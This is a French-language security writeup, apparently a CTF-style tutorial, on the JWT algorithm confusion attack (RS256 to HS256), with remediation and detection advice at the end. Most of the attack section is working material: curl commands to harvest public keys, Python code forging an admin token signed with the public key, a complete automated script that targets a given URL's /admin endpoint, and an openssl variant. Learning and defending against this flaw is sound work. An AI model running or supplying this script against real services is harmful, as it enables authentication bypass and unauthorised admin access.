#  Algorithm Confusion (RS256 → HS256)

> **Auteur :** [@spectramz](https://github.com/exploit4040) — *"Le roi des pirates"* 🏴‍☠️
> **Catégorie :** Web Exploitation — Cryptographie
> **Difficulté :** ⭐⭐⭐⭐☆
> **Tags :** `jwt`, `rsa`, `hmac`, `algorithm-confusion`, `rs256`, `hs256`, `asymmetric`

---

##  Table des matières

- [Contexte](#-contexte)
- [Principe de l'attaque](#-principe-de-lattaque)
- [Prérequis](#-prérequis)
- [Exploitation pas à pas](#-exploitation-pas-à-pas)
- [Script Python automatisé](#-script-python-automatisé)
- [Variantes](#-variantes)
- [Détection](#-détection)
- [Remédiation](#-remédiation)
- [Références](#-références)

---

##  Contexte

Les JWT peuvent être signés avec deux familles d'algorithmes :

| Famille | Algorithme | Clé de vérification |
|---------|------------|---------------------|
| **Symétrique** | HS256 | Secret partagé |
| **Asymétrique** | RS256 | Clé **publique** |

L'attaque **Algorithm Confusion** exploite une faille dans certaines bibliothèques JWT : elles utilisent **la même variable** pour stocker la clé, que l'algorithme soit HS256 ou RS256. Si le serveur accepte les deux, un attaquant peut :

1. Récupérer la **clé publique** (souvent exposée)
2. Forger un token **HS256** signé avec cette clé publique
3. Le serveur, croyant vérifier un HS256, utilise la clé publique comme **secret HMAC** → signature valide

C'est une attaque **critique** car la clé publique est, par définition, accessible à tous.

---

##  Principe de l'attaque

### Comportement normal



Token RS256 → Serveur vérifie avec clé publique → OK
Token HS256 → Serveur vérifie avec secret HMAC → OK (si secret connu)
text


### Comportement vulnérable

Token HS256 forgé → Serveur utilise la clé PUBLIQUE comme secret HMAC
→ Signature valide (car on a signé avec la même clé)
→ Token accepté ✗
text


**Le problème** : la bibliothèque fait confiance à l'algorithme **déclaré dans le header**, au lieu de forcer celui attendu par le serveur.

---

##  Prérequis

- Un JWT **RS256** légitime
- La **clé publique** du serveur (souvent exposée sur `/key`, `/.well-known/jwks.json`, `/jwks.json`)
- Python avec `pyjwt` + `requests`

---

## 🛠️ Exploitation pas à pas

### Étape 1 — Récupérer la clé publique

Tester plusieurs endpoints classiques :

```bash
curl http://<cible>/key
curl http://<cible>/.well-known/jwks.json
curl http://<cible>/jwks.json
curl http://<cible>/public.key
curl http://<cible>/jwks

Format JWKS :
json

{
  "keys": [
    {
      "kty": "RSA",
      "kid": "...",
      "use": "sig",
      "n": "...",
      "e": "AQAB"
    }
  ]
}

Convertir JWKS en PEM :
python

from jwt.algorithms import RSAAlgorithm
import json

jwks = json.loads(requests.get("http://<cible>/jwks.json").text)
public_key = RSAAlgorithm.from_jwk(json.dumps(jwks["keys"][0]))
print(public_key)

Étape 2 — Obtenir un token RS256 légitime
bash

curl -X POST http://<cible>/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}'

Décoder le header :
json

{
  "alg": "RS256",
  "typ": "JWT"
}

Étape 3 — Forger un token HS256
python

import jwt
import requests

# 1. Récupérer la clé publique
public_key = requests.get("http://<cible>/key").text

# 2. Payload admin
payload = {
    "username": "admin",
    "role": "admin",
    "admin": True
}

# 3. Forger avec HS256 + clé publique comme secret
forged = jwt.encode(
    payload,
    public_key,
    algorithm="HS256",
    headers={"alg": "HS256", "typ": "JWT"}
)

print(f"Token forgé : {forged}")

Étape 4 — Envoyer le token
bash

curl http://<cible>/admin \
  -H "Authorization: Bearer <FORGED_TOKEN>"

Réponse attendue : 200 OK avec les données admin.
🤖 Script Python automatisé
python

#!/usr/bin/env python3
"""
Algorithm Confusion attack (RS256 → HS256).
Auteur : SpectraMz
"""
import jwt
import requests
import json
import base64
import sys

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64url_decode(data: str) -> bytes:
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)

def forge_token(public_key: str, payload: dict) -> str:
    """Forge un token HS256 signé avec la clé publique."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()

    import hmac, hashlib
    signature = hmac.new(
        public_key.encode(),
        signing_input,
        hashlib.sha256
    ).digest()
    sig_b64 = b64url_encode(signature)

    return f"{header_b64}.{payload_b64}.{sig_b64}"

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <TARGET_URL>")
        sys.exit(1)

    target = sys.argv[1].rstrip("/")

    # 1. Récupérer la clé publique
    print("[*] Récupération de la clé publique...")
    r = requests.get(f"{target}/key", timeout=10)
    public_key = r.text
    print(f"[+] Clé récupérée ({len(public_key)} octets)")

    # 2. Payload admin
    payload = {
        "username": "admin",
        "role": "admin",
        "admin": True
    }

    # 3. Forger
    print("[*] Forge du token HS256...")
    forged = forge_token(public_key, payload)
    print(f"[+] Token forgé : {forged[:80]}...")

    # 4. Tester
    print("[*] Test sur /admin...")
    r = requests.post(
        f"{target}/admin",
        headers={"Authorization": f"Bearer {forged}"},
        timeout=10
    )
    print(f"[+] Status : {r.status_code}")
    print(f"[+] Réponse : {r.text[:500]}")

if __name__ == "__main__":
    main()

Utilisation :
bash

python3 algorithm_confusion.py http://target.com

🔄 Variantes
Variante 1 — JWKS + PEM

Si le serveur expose un JWKS, il faut convertir la clé JWK en PEM avant de l'utiliser :
python

from jwt.algorithms import RSAAlgorithm
import json

jwks = json.loads(requests.get(f"{target}/jwks.json").text)
public_key = RSAAlgorithm.from_jwk(json.dumps(jwks["keys"][0]))

Variante 2 — Sans pyjwt

Si pyjwt refuse de signer en HS256 avec une clé RSA (comportement de sécurité), on peut utiliser openssl :
bash

# Header
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')

# Payload
PAYLOAD=$(echo -n '{"username":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')

# Signature HMAC avec la clé publique comme secret
SIGNATURE=$(echo -n "$HEADER.$PAYLOAD" | openssl dgst -sha256 -hmac "$(cat public.pem)" -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')

echo "$HEADER.$PAYLOAD.$SIGNATURE"

Variante 3 — Avec padding sur la clé publique

Parfois, la clé publique utilisée côté serveur contient un \n final. Il faut tester plusieurs formats :
python

public_key = "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----\n"
# ou
public_key = "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----"
# ou
public_key = "-----BEGIN PUBLIC KEY-----...-----END PUBLIC KEY-----"

🔍 Détection
Logs suspects

    Tokens dont l'algorithme (alg) ne correspond pas à la politique du serveur

    Tokens HS256 sur un serveur qui ne devrait émettre que du RS256

    Signatures invalides avec la clé attendue mais valides avec la clé publique

Monitoring

    Alerter si un token RS256 est reçu avec alg: HS256

    Journaliser l'algorithme utilisé pour chaque vérification

🛡️ Remédiation
Code vulnérable
python

# ❌ Accepte n'importe quel algorithme
jwt.decode(token, PUBLIC_KEY)

Code sécurisé
python

# ✅ Force RS256 uniquement
jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])

# ✅ Encore mieux : charger la clé publique typée
from jwt.algorithms import RSAAlgorithm
key = RSAAlgorithm.from_jwk(jwks)
jwt.decode(token, key, algorithms=["RS256"])

Règles d'or
Règle	Détail
Forcer l'algorithme	Toujours passer algorithms=["RS256"]
Ne jamais mélanger	Ne jamais passer une liste contenant HS et RS
Vérifier le type de clé	Une clé RSA ne peut pas être un secret HMAC
Utiliser la dernière version	Les bibliothèques récentes lèvent une erreur
Restreindre les endpoints	Ne pas exposer /key si ce n'est pas nécessaire
📚 Références

    Critical vulnerabilities in JSON Web Token libraries — Auth0

    JWT Algorithm Confusion — PortSwigger

    RFC 7515 — JSON Web Signature

    CVE-2015-9235 — jsonwebtoken

<p align="center"> <b>🏴‍☠️ SpectraMz — Stay Curious, Hack Ethically</b> </p> ```
